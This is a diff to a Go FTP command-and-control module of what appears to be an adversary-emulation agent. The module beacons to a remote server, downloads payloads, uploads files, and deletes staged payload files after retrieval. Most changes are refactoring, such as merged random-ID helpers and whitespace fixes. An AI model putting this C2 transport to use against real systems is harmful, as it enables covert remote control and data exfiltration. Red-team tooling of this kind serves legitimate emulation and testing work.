@@ -39,8 +39,8 @@ func (f *FTP) GetBeaconBytes(profile map[string]interface{}) []byte {
     var retProfile []byte
     retBytes, heartbeat := f.FtpBeacon(profile)
     if heartbeat == true {
-	    retProfile = retBytes
-	}
+        retProfile = retBytes
+    }
     return retProfile
 }
 
@@ -62,6 +62,7 @@ func (f *FTP) GetPayloadBytes(profile map[string]interface{}, payloadName string
         output.VerbosePrint(fmt.Sprintf("[-] Failed to download file from FTP Server: %s", err.Error()))
         return nil, ""
     }
+    f.client.Delete(payloadName)
 	return data, payloadName
 }
 
@@ -69,7 +70,7 @@ func (f *FTP) GetPayloadBytes(profile map[string]interface{}, payloadName string
 func (f *FTP) C2RequirementsMet(profile map[string]interface{}, c2Config map[string]string) (bool, map[string]string) {
     config := make(map[string]string)
     if len(profile["paw"].(string)) == 0 {
-        config["paw"] = getBeaconNameIdentifier()
+        config["paw"] = getRandomId()
     }
     return true, config
 }
@@ -102,7 +103,7 @@ func (f *FTP) SetUpstreamDestAddr(upstreamDestAddr string) {
     f.ipAddress = upstreamDestAddr
     f.user = USER
     f.pword = PWORD
-    f.directory = DIRECTORY
+    f.directory = "/" + DIRECTORY
 
 	client, errConnect := ftp.Dial(f.ipAddress)
 	if errConnect != nil {
@@ -123,7 +124,7 @@ func (f *FTP) UploadFileBytes(profile map[string]interface{}, uploadName string,
     paw := profile["paw"].(string)
 	uniqueFileName := uploadName
 	if uniqueFileName != "Alive.txt" && uniqueFileName != "Payload.txt"{
-	    uploadId := getNewUploadId()
+	    uploadId := getRandomId()
 	    uniqueFileName = uploadName + "-" + uploadId
 	}
 
@@ -183,8 +184,8 @@ func (f *FTP) FtpBeacon(profile map[string]interface{}) ([]byte, bool) {
         return nil, false
     }
 
-    connect := f.UploadFileBytes(profile, "Alive.txt", data)
-    if connect != nil {
+    connectErr := f.UploadFileBytes(profile, "Alive.txt", data)
+    if connectErr != nil {
         output.VerbosePrint("[!] Error sending beacon to FTP Server")
         return nil, false
 	}
@@ -220,18 +221,14 @@ func (f *FTP) DownloadFile(filename string) ([]byte,error) {
         f.client.Delete(filename)
         f.client.Delete("Alive.txt")
     }
-
+    if filename != "Alive.txt" && filename != "Response.txt"{
+        f.client.Delete("Payload.txt")
+    }
     return data, nil
 }
 
 //If no paw, create one
-func getBeaconNameIdentifier() string {
+func getRandomId() string {
     rand.Seed(time.Now().UnixNano())
     return strconv.Itoa(rand.Int())
-}
-
-//Create unique id for file upload
-func getNewUploadId() string {
-	rand.Seed(time.Now().UnixNano())
-	return strconv.Itoa(rand.Int())
 }
